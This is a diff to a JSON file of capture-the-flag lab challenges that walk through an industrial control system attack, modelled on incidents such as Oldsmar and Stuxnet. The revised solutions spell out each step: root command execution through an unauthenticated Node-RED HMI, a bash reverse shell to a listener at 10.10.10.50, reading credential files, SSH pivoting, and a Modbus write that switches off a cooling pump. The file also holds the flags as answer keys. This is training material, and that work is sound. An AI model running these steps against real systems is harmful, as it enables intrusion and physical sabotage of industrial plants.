@@ -21,7 +21,7 @@
       "estimated_duration": 10,
       "answer": "FLAG{SCADA_HMI_COMPROMISED}",
       "content": "### The Situation\n\nDirect network routing to the PLC control network (`192.168.20.0/24`) is blocked by the gateway firewall (`ot-gateway`). However, network reconnaissance reveals that the SCADA Human-Machine Interface (HMI) running on `192.168.100.10` has a port open in the operations subnet.\n\nThis mirrors the **2021 Oldsmar, Florida water plant breach**, where attackers hijacked an exposed control panel to alter water chemical levels.\n\n### Your Objective\n\n1. Connect to the unauthenticated Node-RED graphical flow editor on the HMI at `http://192.168.100.10:1880`.\n2. Leverage the graphical workspace to run system-level commands as `root` (RCE). Read the flag located at `/root/flag.txt`.\n3. Search the HMI filesystem for any credentials or notes left behind by the plant operators that could allow you to pivot further.",
-      "solution": "Drag an inject node wired to an exec node executing 'cat /root/flag.txt' and debug node. Deploy and click inject to output the flag. Run 'cat /home/debian/ews_credentials.txt' to retrieve the SSH credentials.",
+      "solution": "1. Connect to Node-RED HMI editor: http://192.168.100.10:1880/\n2. Drag inject, exec, and debug nodes onto the canvas and wire them: inject -> exec -> debug.\n3. Configure the exec node command field with: cat /root/flag.txt\n4. Click Deploy and click the inject node's trigger button. Read the flag in the Debug panel.\n5. To locate credentials, change the exec node command field to: cat /home/debian/ews_credentials.txt and trigger it.",
       "hints": [
         {
           "title": "Graphical RCE Node Selection",
@@ -44,7 +44,7 @@
       "estimated_duration": 15,
       "answer": "192.168.20.10",
       "content": "### The Situation\n\nYou now hold credentials for the Engineering Workstation (EWS), which has administrative access to the PLC network. This step mimics the **2015 Ukraine Power Grid cyberattack**, where attackers pivoted from the compromised corporate subnets to the high-privilege EWS nodes to control remote substations.\n\nDirect access to the control subnet (`192.168.20.0/24`) is blocked from Kali, but is permitted from the SCADA HMI.\n\n### Your Objective\n\n1. Establish an interactive terminal connection to the EWS at `192.168.20.20` using the stolen credentials.\n2. Scan the internal control subnet (`192.168.20.0/24`) to identify the IP address of the active PLC.\n\nWhat is the IP address of the PLC?",
-      "solution": "SSH into `operator@192.168.20.20` using password `operator123`. Run `nmap -sn 192.168.20.0/24` to discover the active PLC at `192.168.20.10`.",
+      "solution": "1. Start a netcat listener on Kali: nc -nlvp 4444\n2. Configure a Node-RED exec node command with the reverse shell: bash -c 'bash -i >& /dev/tcp/10.10.10.50/4444 0>&1' and trigger it.\n3. On the caught shell, upgrade the PTY: python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n4. SSH into EWS: ssh operator@192.168.20.20 (use password operator123)\n5. Find the active PLC by running: nmap -sn 192.168.20.0/24 to identify 192.168.20.10.",
       "hints": [
         {
           "title": "SSH Credential Recall",
@@ -73,7 +73,7 @@
       "estimated_duration": 15,
       "answer": "FLAG{PUMP_DISABLED_SUCCESS}",
       "content": "### The Situation\n\nYou have gained access to the Engineering Workstation (`192.168.20.20`) and identified the target PLC at `192.168.20.10`. The controller manages a cooling loop pump mapped to Modbus Holding Register 0 (PLC Address 40001). Currently, the register is set to `1` (normal operational loop).\n\nLike **Stuxnet (2010)** or **Industroyer (2016)**, you will inject raw industrial protocol commands to directly manipulate physical process registers.\n\n### Your Objective\n\n1. From the EWS terminal, write the sabotage value `0` to Holding Register 0 to force the cooling pump to turn off.\n2. The safety monitoring sidecar running on the EWS will detect the unauthorized register overwrite and record the validation flag in the safety log.\n3. Retrieve the flag from the EWS log directory to complete the assessment.",
-      "solution": "From the EWS shell, run: `modbus 192.168.20.10 0=0`. Then run `cat /var/log/safety_override.txt` to read the flag.",
+      "solution": "1. Run the Modbus write command: modbus 192.168.20.10 0=0\n2. Read the safety override flag file: cat /var/log/safety_override.txt",
       "hints": [
         {
           "title": "Modbus CLI Syntax",
